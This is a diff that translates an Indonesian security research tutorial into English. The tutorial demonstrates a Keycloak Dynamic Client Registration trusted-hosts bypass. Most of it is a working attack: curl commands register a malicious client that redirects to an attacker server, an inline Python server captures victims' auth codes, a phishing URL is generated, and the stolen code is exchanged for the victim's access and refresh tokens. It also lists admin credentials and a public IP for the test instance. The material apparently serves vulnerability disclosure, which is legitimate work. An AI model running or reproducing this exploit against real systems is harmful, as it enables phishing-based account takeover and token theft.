@@ -1,23 +1,23 @@
-# Tutorial: Finding #5 — DCR Trusted Hosts Bypass → Pencurian Token via Phishing Live
+# Tutorial: Finding #5 — DCR Trusted Hosts Bypass — Live Token Theft via Phishing
 
 **Severity:** HIGH (CVSS 8.0)
-**Waktu demo:** ~10 menit
-**Kebutuhan:** 2 Terminal + 1 Browser
-**Ini finding paling impactful — full token theft dari victim secara real-time!**
+**Demo time:** ~10 minutes
+**Requirements:** 2 Terminals + 1 Browser
+**This is the most impactful finding — full token theft from the victim in real-time!**
 
 ---
 
-## Skenario Serangan
+## Attack Scenario
 
-1. **Attacker** (punya akun biasa + role `create-client`) menjalankan script
-2. Script otomatis register client jahat, buat URL phishing, jalankan server penangkap
-3. **Attacker** kirim URL phishing ke **victim** (via email, chat, dll)
-4. **Victim** klik link → melihat halaman login Keycloak yang 100% asli → login
-5. Auth code otomatis dikirim ke server attacker → ditukar jadi **token victim**
+1. **Attacker** (has a regular account + `create-client` role) runs the script
+2. Script automatically registers a malicious client, generates a phishing URL, starts a capture server
+3. **Attacker** sends the phishing URL to the **victim** (via email, chat, etc.)
+4. **Victim** clicks the link → sees a 100% legitimate Keycloak login page → logs in
+5. Auth code is automatically sent to the attacker's server → exchanged for **victim's token**
 
 ---
 
-## Langkah 0: Pastikan Keycloak Berjalan
+## Step 0: Ensure Keycloak is Running
 
 ```bash
 curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
@@ -25,17 +25,17 @@ curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('
 
 ---
 
-## Langkah 1: (ADMIN SETUP) Assign create-client Role ke testuser
+## Step 1: (ADMIN SETUP) Assign create-client Role to testuser
 
 ### Via Admin Console:
-1. Buka: `http://46.101.162.187:8080/admin/master/console/`
+1. Open: `http://46.101.162.187:8080/admin/master/console/`
 2. Login: `admin` / `Admin1234`
-3. Realm **test** → **Users** → klik **testuser**
-4. Tab **Role mappings** → klik **Assign role**
-5. Filter by client → pilih **realm-management**
-6. Centang **create-client** → klik **Assign**
+3. Realm **test** → **Users** → click **testuser**
+4. Tab **Role mappings** → click **Assign role**
+5. Filter by client → select **realm-management**
+6. Check **create-client** → click **Assign**
 
-### Atau via CLI:
+### Or via CLI:
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
   -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
@@ -61,83 +61,83 @@ curl -s -o /dev/null -w "Assign role: HTTP %{http_code}\n" -X POST \
 
 ---
 
-## Cara A: Jalankan Python PoC (Otomatis — Recommended untuk Demo Video)
+## Method A: Run Python PoC (Automated — Recommended for Video Demo)
 
-### Terminal 1 — Jalankan script serangan:
+### Terminal 1 — Run the attack script:
 
 ```bash
 cd /home/anggi/keycloak-research
 python3 pocs/poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888
 ```
 
-Script akan:
-1. Otomatis login sebagai attacker (testuser)
-2. Register client jahat via DCR
-3. Buat URL phishing
-4. Jalankan server penangkap di port 48888
-5. Menunggu victim mengklik URL dan login...
+The script will:
+1. Automatically login as the attacker (testuser)
+2. Register a malicious client via DCR
+3. Generate a phishing URL
+4. Start a capture server on port 48888
+5. Wait for the victim to click the URL and login...
 
-**Output yang muncul:**
+**Expected output:**
 ```
 ╔══════════════════════════════════════════════════════════════╗
-║                 URL PHISHING SIAP KIRIM                      ║
+║                 PHISHING URL READY TO SEND                   ║
 ╚══════════════════════════════════════════════════════════════╝
 
-Kirim URL berikut ke target victim:
+Send the following URL to the target victim:
 
 http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=XXXXX&response_type=code&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&scope=openid+profile+email
 
-⠋ Menunggu victim... (5s / 300s) — Buka URL di browser untuk simulasi
+⠋ Waiting for victim... (5s / 300s) — Open URL in browser to simulate
 ```
 
-### Browser — Simulasi victim:
+### Browser — Simulate the victim:
 
-1. **Copy URL phishing** dari output Terminal 1
-2. **Buka URL tersebut di browser**
-3. Akan muncul **halaman login Keycloak yang 100% asli** — tidak ada tanda-tanda mencurigakan!
-4. Login sebagai victim:
+1. **Copy the phishing URL** from Terminal 1 output
+2. **Open that URL in the browser**
+3. A **100% legitimate Keycloak login page** will appear — no suspicious signs!
+4. Login as the victim:
    - Username: `victim`
    - Password: `Password123`
-5. Setelah login, victim melihat halaman **"Login Berhasil!"** (padahal ini halaman palsu dari attacker)
+5. After login, the victim sees a **"Login Successful!"** page (but this is actually a fake page from the attacker)
 
-### Kembali ke Terminal 1 — Auth code tertangkap otomatis:
+### Back to Terminal 1 — Auth code captured automatically:
 
 ```
 =======================================================
-  *** AUTH CODE VICTIM TERTANGKAP! ***
+  *** VICTIM AUTH CODE CAPTURED! ***
 =======================================================
   Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
 =======================================================
 
-[Langkah 7] ATTACKER — Tukar auth code curian menjadi token victim
+[Step 7] ATTACKER — Exchange stolen auth code for victim's token
 
 ╔══════════════════════════════════════════════════════════════╗
-║           TOKEN VICTIM BERHASIL DICURI!                      ║
+║           VICTIM TOKEN SUCCESSFULLY STOLEN!                  ║
 ╚══════════════════════════════════════════════════════════════╝
 
   Username     : victim
   Email        : victim@test.com
-  Nama Lengkap: Victim User
+  Full Name    : Victim User
   Scope        : openid profile email
   Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
   Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...
 
-Attacker sekarang punya akses penuh ke akun victim!
+Attacker now has full access to the victim's account!
 ```
 
-### Mode Auto-Victim (untuk testing tanpa browser):
+### Auto-Victim Mode (for testing without a browser):
 
 ```bash
 python3 pocs/poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --auto-victim --timeout 30
 ```
 
-Flag `--auto-victim` akan otomatis simulasi login victim tanpa perlu browser.
+The `--auto-victim` flag will automatically simulate victim login without requiring a browser.
 
 ---
 
-## Cara B: Manual Step-by-Step (Untuk Pemahaman Detail)
+## Method B: Manual Step-by-Step (For Detailed Understanding)
 
-### Langkah 2: (ATTACKER) Login dan Dapatkan Token
+### Step 2: (ATTACKER) Login and Obtain Token
 
 ```bash
 ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -151,7 +151,7 @@ ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol
 echo "Attacker token: ${ATTACKER_TOKEN:0:40}..."
 ```
 
-### Langkah 3: (ATTACKER) Register Client Jahat via DCR
+### Step 3: (ATTACKER) Register Malicious Client via DCR
 
 ```bash
 REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
@@ -167,7 +167,7 @@ REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-regist
 echo "$REG_RESP" | python3 -c "
 import sys,json
 d = json.load(sys.stdin)
-print('=== CLIENT JAHAT TERDAFTAR! ===')
+print('=== MALICIOUS CLIENT REGISTERED! ===')
 print(f'Client ID:     {d[\"client_id\"]}')
 print(f'Client Secret: {d[\"client_secret\"]}')
 print(f'Redirect URI:  {d[\"redirect_uris\"]}')
@@ -178,9 +178,9 @@ MAL_CLIENT_ID=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(
 MAL_SECRET=$(echo "$REG_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['client_secret'])")
 ```
 
-> **VULNERABLE:** Client dengan redirect ke server attacker berhasil terdaftar tanpa penolakan!
+> **VULNERABLE:** Client with redirect to attacker's server was registered without rejection!
 
-### Langkah 4: (KONTROL) Anonymous DCR — Harus Ditolak
+### Step 4: (CONTROL) Anonymous DCR — Should Be Rejected
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
@@ -189,7 +189,7 @@ curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/ope
   | python3 -m json.tool
 ```
 
-**Output (Benar Ditolak):**
+**Output (Correctly Rejected):**
 ```json
 {
   "error": "insufficient_scope",
@@ -197,9 +197,9 @@ curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/ope
 }
 ```
 
-### Langkah 5: (ATTACKER) Jalankan Server Penangkap (Terminal 2)
+### Step 5: (ATTACKER) Start Capture Server (Terminal 2)
 
-Buka terminal baru — ini server yang akan menangkap auth code victim:
+Open a new terminal — this server will capture the victim's auth code:
 
 ```bash
 python3 -c "
@@ -213,61 +213,61 @@ class H(BaseHTTPRequestHandler):
             code = params['code'][0]
             print()
             print('=' * 55)
-            print('  *** AUTH CODE VICTIM TERTANGKAP! ***')
+            print('  *** VICTIM AUTH CODE CAPTURED! ***')
             print('=' * 55)
             print(f'  Code: {code}')
             print('=' * 55)
             print()
-            print('Gunakan code ini di Langkah 8 untuk curi token victim!')
+            print('Use this code in Step 8 to steal the victim token!')
             print()
         self.send_response(200)
         self.send_header('Content-Type','text/html')
         self.end_headers()
-        self.wfile.write(b'<html><body><h2>Login Berhasil!</h2><p>Halaman ini dapat ditutup.</p></body></html>')
+        self.wfile.write(b'<html><body><h2>Login Successful!</h2><p>This page can be closed.</p></body></html>')
     def log_message(self, *a): pass
 
-print('Server penangkap aktif di port 48888...')
-print('Menunggu victim klik URL phishing dan login...')
+print('Capture server active on port 48888...')
+print('Waiting for victim to click phishing URL and login...')
 HTTPServer(('0.0.0.0', 48888), H).serve_forever()
 "
 ```
 
-### Langkah 6: (ATTACKER) Buat URL Phishing (Terminal 1)
+### Step 6: (ATTACKER) Generate Phishing URL (Terminal 1)
 
 ```bash
 echo ""
-echo "=== URL PHISHING ==="
-echo "Kirim URL ini ke victim:"
+echo "=== PHISHING URL ==="
+echo "Send this URL to the victim:"
 echo ""
 echo "http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?client_id=${MAL_CLIENT_ID}&response_type=code&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&scope=openid+profile+email"
 echo ""
-echo "URL ini terlihat 100% legitimate — domain Keycloak asli!"
+echo "This URL looks 100% legitimate — real Keycloak domain!"
 echo "===================="
 ```
 
-### Langkah 7: (VICTIM) Klik URL dan Login
+### Step 7: (VICTIM) Click URL and Login
 
-1. **Buka URL phishing di browser**
-2. Halaman login **Keycloak asli** muncul — tidak ada tanda mencurigakan
-3. Login sebagai victim:
+1. **Open the phishing URL in a browser**
+2. The **real Keycloak** login page appears — no suspicious signs
+3. Login as victim:
    - Username: `victim`
    - Password: `Password123`
-4. Victim melihat halaman "Login Berhasil!" (palsu dari attacker)
+4. Victim sees a "Login Successful!" page (fake, from the attacker)
 
-**Di Terminal 2 (server penangkap) muncul:**
+**In Terminal 2 (capture server) the following appears:**
 ```
 =======================================================
-  *** AUTH CODE VICTIM TERTANGKAP! ***
+  *** VICTIM AUTH CODE CAPTURED! ***
 =======================================================
   Code: 7e7cad47-b4b2-e780-9295-6dd0c51e7e9e.J191clIaMcw...
 =======================================================
 ```
 
-### Langkah 8: (ATTACKER) Tukar Auth Code → Token Victim
+### Step 8: (ATTACKER) Exchange Auth Code → Victim Token
 
 ```bash
-# Ganti AUTH_CODE dengan code yang tertangkap di Terminal 2
-AUTH_CODE="PASTE_CODE_DARI_TERMINAL_2"
+# Replace AUTH_CODE with the code captured in Terminal 2
+AUTH_CODE="PASTE_CODE_FROM_TERMINAL_2"
 
 curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
   -d "client_id=$MAL_CLIENT_ID" \
@@ -288,25 +288,25 @@ claims = json.loads(base64.b64decode(payload))
 
 print()
 print('====================================')
-print('  TOKEN VICTIM BERHASIL DICURI!')
+print('  VICTIM TOKEN SUCCESSFULLY STOLEN!')
 print('====================================')
 print(f'  Username:      {claims.get(\"preferred_username\")}')
 print(f'  Email:         {claims.get(\"email\")}')
-print(f'  Nama:          {claims.get(\"name\")}')
+print(f'  Name:          {claims.get(\"name\")}')
 print(f'  User ID:       {claims.get(\"sub\")}')
 print(f'  Scope:         {d.get(\"scope\")}')
 print(f'  Access Token:  {at[:50]}...')
 print(f'  Refresh Token: {d.get(\"refresh_token\",\"\")[:50]}...')
 print('====================================')
 print()
-print('Attacker sekarang punya akses penuh ke akun victim!')
+print('Attacker now has full access to the victim account!')
 "
 ```
 
-### Langkah 9: (ATTACKER) Verifikasi — Akses Data Victim
+### Step 9: (ATTACKER) Verify — Access Victim Data
 
 ```bash
-# Ambil access token dari langkah sebelumnya
+# Get access token from the previous step
 VICTIM_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
   -d "client_id=$MAL_CLIENT_ID" \
   -d "client_secret=$MAL_SECRET" \
@@ -322,53 +322,53 @@ curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo 
 
 ---
 
-## Ringkasan
+## Summary
 
-| Langkah | Aksi | Hasil |
+| Step | Action | Result |
 |---|---|---|
-| 1 | Attacker register client via authenticated DCR | Client dengan redirect ke server attacker — **BERHASIL** |
-| 2 | Kontrol: Anonymous DCR | **DITOLAK** oleh Trusted Hosts (benar) |
-| 3 | Attacker generate URL phishing | URL 100% legitimate domain Keycloak |
-| 4 | Server penangkap menunggu victim | Listener aktif, siap tangkap auth code |
-| 5 | Victim klik URL, login di Keycloak asli | Auth code redirect ke server attacker — **TERTANGKAP** |
-| 6 | Attacker tukar auth code | Token victim — **DICURI PENUH** |
-| 7 | Akses data victim | Userinfo berhasil diakses — **TERVERIFIKASI** |
+| 1 | Attacker registers client via authenticated DCR | Client with redirect to attacker's server — **SUCCESS** |
+| 2 | Control: Anonymous DCR | **BLOCKED** by Trusted Hosts (correct) |
+| 3 | Attacker generates phishing URL | 100% legitimate Keycloak domain URL |
+| 4 | Capture server waits for victim | Listener active, ready to capture auth code |
+| 5 | Victim clicks URL, logs in on real Keycloak | Auth code redirected to attacker's server — **CAPTURED** |
+| 6 | Attacker exchanges auth code | Victim's token — **FULLY STOLEN** |
+| 7 | Access victim data | Userinfo successfully accessed — **VERIFIED** |
 
 **Policy Gap:**
-- **Anonymous DCR:** Trusted Hosts DITERAPKAN (benar)
-- **Authenticated DCR:** Trusted Hosts **TIDAK ADA** (kerentanan)
-- **Admin REST API:** Return 403 (benar)
+- **Anonymous DCR:** Trusted Hosts ENFORCED (correct)
+- **Authenticated DCR:** Trusted Hosts **ABSENT** (vulnerability)
+- **Admin REST API:** Returns 403 (correct)
 
-**Alur Serangan:**
+**Attack Flow:**
 ```
-Attacker jalankan script
+Attacker runs script
         │
         ▼
-Register client jahat (redirect → server attacker)
+Register malicious client (redirect → attacker's server)
         │
         ▼
-Generate URL phishing (domain Keycloak asli)
+Generate phishing URL (real Keycloak domain)
         │
         ▼
-Kirim URL ke victim ──────► Victim klik URL
+Send URL to victim ──────► Victim clicks URL
                                     │
                                     ▼
-                            Halaman login Keycloak ASLI
+                            REAL Keycloak login page
                                     │
                                     ▼
-                            Victim login (victim / Password123)
+                            Victim logs in (victim / Password123)
                                     │
                                     ▼
                             Keycloak redirect + auth code
                                     │
                                     ▼
-                    Server attacker tangkap auth code ◄──┘
+                    Attacker's server captures auth code ◄──┘
                                     │
                                     ▼
-                    Tukar code → token victim
+                    Exchange code → victim's token
                                     │
                                     ▼
-                    AKSES PENUH KE AKUN VICTIM
+                    FULL ACCESS TO VICTIM'S ACCOUNT
 ```
 
-**Kesimpulan:** Satu user dengan role `create-client` bisa mencuri token user manapun di realm yang sama, termasuk admin. Serangan ini sangat berbahaya karena victim melihat halaman login yang 100% asli dari domain Keycloak.
+**Conclusion:** A single user with the `create-client` role can steal the token of any user in the same realm, including admins. This attack is extremely dangerous because the victim sees a login page that is 100% genuine from the real Keycloak domain.
